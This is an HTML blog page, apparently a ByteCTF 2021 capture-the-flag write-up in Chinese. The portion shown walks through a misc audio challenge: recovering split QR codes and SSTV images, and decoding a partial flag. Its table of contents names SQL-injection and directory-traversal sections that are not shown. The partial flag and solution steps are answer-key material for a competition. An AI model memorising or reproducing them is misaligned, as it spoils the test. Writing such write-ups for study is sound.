@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang=zh-TW>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ＭiscHearingNotBelieving Hearing is not believing  將附件的音訊使用 Audition 開啟可以在其前面發現分割的二維碼。  將二維碼合成處理可以得到如下二維碼。  掃描二維碼可得如下內容。 1m4yB3_  將音訊後面的內容使用 RX-SSTV 進行接受可得 16 張圖片。將圖片按照順序 4*4 拼接即可得到如下圖片。  將二維碼復原可得如下二維碼">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ByteCTF 2021">
+<meta property="og:url" content="https://lemonprefect.cn/zh-TW/posts/611b2d51.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="ＭiscHearingNotBelieving Hearing is not believing  將附件的音訊使用 Audition 開啟可以在其前面發現分割的二維碼。  將二維碼合成處理可以得到如下二維碼。  掃描二維碼可得如下內容。 1m4yB3_  將音訊後面的內容使用 RX-SSTV 進行接受可得 16 張圖片。將圖片按照順序 4*4 拼接即可得到如下圖片。  將二維碼復原可得如下二維碼">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620470941119/48e96bf072ae3441d82c7882da2ed2e285791c8b.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620626932789/4780ae55d0fd763f4ac3f79bfb533b77f2d61220.png@200w.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620689531183/d703186770be8768899cdc68a7a66b1e0c211f46.png@300w.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620733206761/041be496ce7aac1da1a65a0762bc2210dd3e5fa1.png@200w.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620786377949/844179c9969a7684f894411b54401d4210bdbec0.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634621373482519/76b56b2710e243534ddb5249bd8f6f6965181626.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620842128581/c8c022c338e15391aedc7f4505739c08c3072e09.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634623169840229/80d32c00c3d0fe4eedbb534c19f06e757a6283c5.png@300w.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634623235868402/62e8be17e34f38fb1f362ced90b75e283a7de73b.png@200w.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634626277976703/5bd70238a680893c745bf355b23e5bbd187bf550.png">
+<meta property="article:published_time" content="2021-10-15T09:16:00.000Z">
+<meta property="article:modified_time" content="2021-10-25T16:27:32.141Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620470941119/48e96bf072ae3441d82c7882da2ed2e285791c8b.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/avatar.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>ByteCTF 2021</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-CN/posts/611b2d51.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-CN/posts/a282dc59.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="/zh-CN/posts/611b2d51.html">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="#">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="回到頁首 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到頁首</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/611b2d51.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&text=ByteCTF 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&title=ByteCTF 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&is_video=false&description=ByteCTF 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ByteCTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/611b2d51.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&title=ByteCTF 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&title=ByteCTF 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&title=ByteCTF 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&title=ByteCTF 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&name=ByteCTF 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/611b2d51.html&t=ByteCTF 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.</span> <span class="toc-text">Ｍisc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HearingNotBelieving"><span class="toc-number">1.1.</span> <span class="toc-text">HearingNotBelieving</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BabyShark"><span class="toc-number">1.2.</span> <span class="toc-text">BabyShark</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#frequently"><span class="toc-number">1.3.</span> <span class="toc-text">frequently</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-Protocol-Tunnel"><span class="toc-number">1.3.1.</span> <span class="toc-text">DNS Protocol Tunnel</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DHCP-Protocol-IP-Address-Lease-Time"><span class="toc-number">1.3.2.</span> <span class="toc-text">DHCP Protocol IP Address Lease Time</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lost-Excel"><span class="toc-number">1.4.</span> <span class="toc-text">Lost Excel</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Double-sqli"><span class="toc-number">2.1.</span> <span class="toc-text">Double sqli</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E9%8C%84%E7%A9%BF%E8%B6%8A%E8%AE%80%E5%8E%9F%E5%A7%8B%E7%A2%BC"><span class="toc-number">2.1.1.</span> <span class="toc-text">目錄穿越讀原始碼</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ClickHouse-%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.2.</span> <span class="toc-text">ClickHouse 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E7%A8%AE%E7%9B%B2%E6%B3%A8%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">一種盲注的思路</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ByteCTF 2021
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-10-15T09:16:00.000Z" itemprop="datePublished">2021-10-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Misc"><a href="#Misc" class="headerlink" title="Ｍisc"></a>Ｍisc</h2><h3 id="HearingNotBelieving"><a href="#HearingNotBelieving" class="headerlink" title="HearingNotBelieving"></a>HearingNotBelieving</h3><blockquote>
+<p>Hearing is not believing</p>
+</blockquote>
+<p>將附件的音訊使用 Audition 開啟可以在其前面發現分割的二維碼。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620470941119/48e96bf072ae3441d82c7882da2ed2e285791c8b.png"></p>
+<p>將二維碼合成處理可以得到如下二維碼。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620626932789/4780ae55d0fd763f4ac3f79bfb533b77f2d61220.png@200w.png"></p>
+<p>掃描二維碼可得如下內容。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m4yB3_</span><br></pre></td></tr></table></figure>
+
+<p>將音訊後面的內容使用 RX-SSTV 進行接受可得 16 張圖片。將圖片按照順序 4*4 拼接即可得到如下圖片。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620689531183/d703186770be8768899cdc68a7a66b1e0c211f46.png@300w.png"></p>
+<p>將二維碼復原可得如下二維碼。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" 